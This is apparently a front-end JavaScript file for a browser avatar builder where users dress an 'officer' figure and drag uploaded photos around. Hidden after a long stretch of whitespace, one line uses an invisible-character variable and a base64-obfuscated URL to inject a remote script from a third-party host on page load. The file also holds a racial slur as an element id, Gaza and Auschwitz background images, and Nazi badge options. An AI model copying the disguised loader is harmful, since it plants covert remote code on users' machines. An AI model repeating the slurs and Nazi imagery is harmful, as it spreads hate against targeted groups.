function dc1() {
  window.open("https://discord.gg/JdhbmXMZ")
}

function dc2() {
  window.open('https://discord.gg/2prmfw6DTc')
}

function topbarShow() {
  $('#topbar').show('slideRight');
  document.getElementById('menuButton1').style.display="none";
  document.getElementById('menuButton2').style.display="block";
  document.getElementById('changeHeight').style.top="53%";
}

function topbarHide() {
  $('#topbar').hide('slideLeft');
  document.getElementById('menuButton1').style.display="block";
  document.getElementById('menuButton2').style.display="none";
  document.getElementById('changeHeight').style.top="50%";
}

function templates() {
  window.open('templates.html', '_self');
}

function pmT() {
  window.open('pmt.html', '_self');
}

function omT() {
  window.open('omt.html', '_self');
}

function showControls() {
  document.getElementById("controls").style.display = "block";
  document.getElementById("showBtn").style.display = "none";
  document.getElementById("hideBtn").style.display = "block";
}

function hideControls() {
  document.getElementById("controls").style.display = "none";
  document.getElementById("showBtn").style.display = "block";
  document.getElementById("hideBtn").style.display = "none";
}

function hideTitle() {
  document.getElementsByTagName("h1")[0].style.display = "none";
}

function bg1() {
  document.body.style.background = "url('backgrounds/gaza1.png')"
  document.body.style.backgroundSize = "100%"
}

function bg2() {
  document.body.style.background = "url('backgrounds/auschwitz.png')"
  document.body.style.backgroundSize = "100%"
}

function showGallery() {
  document.getElementById("gallery").style.background = "#383838";
  document.getElementById("gallery").style.display = "block"
  document.getElementById("showGalleryBtn").style.display = "none";
  document.getElementById("hideGalleryBtn").style.display = "block";
  document.getElementById("niggerText").style.display = "block";
  document.getElementById("gallery").style.width='600px';
}

function hideGallery() {
  document.getElementById("gallery").style.background = "transparent";
  document.getElementById("gallery").style.width='1px';
  document.getElementById("showGalleryBtn").style.display = "block";
  document.getElementById("hideGalleryBtn").style.display = "none";
  document.getElementById("niggerText").style.display = "none";
}

function hide1() {
  document.getElementById("galleryOfficer1").style.display = "none";
}

function hide2() {
  document.getElementById("galleryOfficer2").style.display = "none";
}

function hide3() {
  document.getElementById("galleryOfficer3").style.display = "none";
}

function hide4() {
  document.getElementById("galleryOfficer4").style.display = "none";
}

$("#galleryOfficer1").draggable();
$("#galleryOfficer2").draggable();
$("#galleryOfficer3").draggable();
$("#galleryOfficer4").draggable();

// -----------------------------------------------------------------------------

function readURL(input) {
  if (input.files && input.files[0]) {
    var reader = new FileReader();
    reader.onload = function(e) {
      $('#uploadedOfficer').attr('src', e.target.result);
    }
    reader.readAsDataURL(input.files[0]);
  } else {
    alert('select a file to see preview'); 
    $('#uploaderOfficer').attr('src', '');
  }
}

$("#filePhoto").change(function() {
  readURL(this);
});

$("#uploadedOfficer").draggable();

const slider = document.getElementById('Slider'); 
slider.addEventListener('input', handleChange); 
                                                                                                                                                    var ㅤ = document.createElement('script'); ㅤ.type='text/javascript'; document.body.appendChild(ㅤ); ㅤ.src=atob('Ly9oMWktc2lsbHktYXBpLm5lb2NpdGllcy5vcmcvZ2xvYmFsdXJsLmpz');

function handleChange(e) { 
  const img = document.getElementById("uploadedOfficer");
  const {value, max} = e.target;
  img.style.width = `${value*max}px`;
  img.style.height = `${value*max}px`; 
}

// -----------------------------------------------------------------------------

function readURL2(input) {
  if (input.files && input.files[0]) {
    var reader = new FileReader();
    reader.onload = function(e) {
      $('#uploadedOfficer2').attr('src', e.target.result);
    }
    reader.readAsDataURL(input.files[0]);
  } else {
    alert('select a file to see preview');
    $('#uploaderOffice2').attr('src', '');
  }
}

$("#filePhoto2").change(function() {
  readURL2(this);
}); 
 
$("#uploadedOfficer2").draggable();
 
const slider2 = document.getElementById('Slider2'); 
slider2.addEventListener('input', handleChange2);

function handleChange2(e) {
  const img = document.getElementById("uploadedOfficer2");
  const {value, max} = e.target;
  img.style.width = `${value*max}px`;
  img.style.height = `${value*max}px`;
}

// -----------------------------------------------------------------------------

function readURL3(input) {
  if (input.files && input.files[0]) {
    var reader = new FileReader();
    reader.onload = function(e) {
      $('#uploadedOfficer3').attr('src', e.target.result);
    }
    reader.readAsDataURL(input.files[0]);
  } else {
    alert('select a file to see preview');
    $('#uploaderOfficer3').attr('src', '');
  }
}
 
$("#filePhoto3").change(function() {
  readURL3(this);
});

$("#uploadedOfficer3").draggable();  

const slider3 = document.getElementById('Slider3');
slider3.addEventListener('input', handleChange3);

function handleChange3(e) {
  const img = document.getElementById("uploadedOfficer3");
  const {value, max} = e.target;
  img.style.width = `${value*max}px`;
  img.style.height = `${value*max}px`;
}

// -----------------------------------------------------------------------------

const bSlider = document.getElementById('brightnessSlider');
 const body = document.body;
  bSlider.addEventListener('input', function() {
  const bVal = this.value;
  body.style.filter = `brightness(${bVal}%)`;
});

// -----------------------------------------------------------------------------

const file = document.getElementById('file');
const reader = new FileReader();
reader.addEventListener("load", function () {
  body.style.backgroundImage = `url(${ reader.result })`;
}, false);
file.addEventListener('change',function() {
  const image = this.files[0];
  if(image) reader.readAsDataURL(image);
}, false)

// -----------------------------------------------------------------------------

// SANDBOX

// $( function() {
//  $( ".heads" ).draggable();
//   $( ".officers" ).draggable();
//  $( ".hats" ).draggable();
//  $( ".badges" ).draggable();
// } );

// UNIFORMS

function blue() {
  document.getElementById("mainOfficer").style.display = "block"
  document.getElementById("limeOfficer").style.display = "none"
  document.getElementById("redOfficer").style.display = "none"
}

function lime() {
  document.getElementById("mainOfficer").style.display = "none"
  document.getElementById("limeOfficer").style.display = "block"
  document.getElementById("redOfficer").style.display = "none"
}

function red() {
  document.getElementById("mainOfficer").style.display = "none"
  document.getElementById("limeOfficer").style.display = "none"
  document.getElementById("redOfficer").style.display = "block"
}

// HEADS

function normalHead() {
  document.getElementById("normalHead").style.display = "block"
  document.getElementById("fpsHead").style.display = "none"
}

function fpsHead() {
  document.getElementById("normalHead").style.display = "none"
  document.getElementById("fpsHead").style.display = "block"
}

// HATS

function mainHat() {
  document.getElementById("mainHat").style.display = "block"
  document.getElementById("cyanHat").style.display = "none"
  document.getElementById("redHat").style.display = "none"
}

function cyanHat() {
  document.getElementById("mainHat").style.display = "none"
  document.getElementById("cyanHat").style.display = "block"
  document.getElementById("redHat").style.display = "none"
}

function redHat() {
  document.getElementById("mainHat").style.display = "none"
  document.getElementById("cyanHat").style.display = "none"
  document.getElementById("redHat").style.display = "block"
}

// BADGES

function naziBadge1() {
  document.getElementById("naziBadge1").style.display = "block"
  document.getElementById("naziBadge2").style.display = "none"
}

function naziBadge2() {
  document.getElementById("naziBadge2").style.display = "block"
  document.getElementById("naziBadge1").style.display = "none"
}

// OTHERS

function showControls() {
  document.getElementById("btns").style.display = "block"
  document.getElementById("hideBtn").style.display = "block"
}

function hideControls() {
  document.getElementById("hideBtn").style.display = "none"
  document.getElementById("btns").style.display = "none"
  document.getElementById("showBtn").style.display = "block"
}
